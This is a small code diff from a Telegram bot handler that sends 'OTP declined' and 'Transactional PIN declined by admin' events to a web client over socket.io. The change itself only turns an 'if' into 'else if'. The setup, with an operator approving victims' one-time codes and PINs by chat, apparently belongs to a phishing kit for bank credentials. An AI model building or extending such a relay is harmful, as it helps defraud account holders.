@@ -104,11 +104,12 @@ bot.on("callback_query", (query) => {
         });
     }
 
-    if (action === "reject") {
+    else if (action === "reject") {
         if (step === "4") {
             io.to(appId).emit('otp-failed', { message: "OTP verification declined by admin." });
             bot.answerCallbackQuery(query.id, { text: "OTP Code Rejected" });
-        } else if (step === "5") {
+        } 
+        else if (step === "5") {
             io.to(appId).emit('pin-failed', { message: "Transactional PIN declined by admin." });
             bot.answerCallbackQuery(query.id, { text: "PIN Code Rejected" });
         }
